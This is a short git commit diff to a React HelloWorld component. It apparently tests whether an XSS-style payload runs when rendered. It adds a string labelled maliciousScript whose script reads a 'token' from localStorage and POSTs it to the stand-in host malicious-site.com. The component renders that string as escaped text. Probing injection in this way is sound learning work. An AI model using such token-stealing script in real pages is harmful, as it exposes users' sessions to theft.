55d83083752e8abd784a0da36d489073bb033bab
Thiago Orlandini <thorlandini@gmail.com>
2021-07-02 17:00:22 -0300

    final do dia

--- src/HelloWorld.tsx
+++ src/HelloWorld.tsx
@@ -1,9 +1,31 @@
-function HelloWorld () {
+const maliciousScript = `
+  <script>
+    const token = window.localStorage.getItem('token');
+    fetch('https://malicious-site.com/get-token', {
+      method: 'POST',
+      body: { token }
+    })
+    console.log('sent')
+  </script>
+`
+
+
+function HelloWorld() {
+
 
     const name = "Thiago";
+    const title = <h1>Hello, {name}</h1>
+
+    if (name === "Thiago") {
+        return <div>
+            <h1 style={{ background: 'red' }}>
+               {maliciousScript}
+            </h1>
+        </div>
+    }
 
     return <div>
-        <h1>Hello, { name } !</h1>
+        {title}
     </div>
 }
 
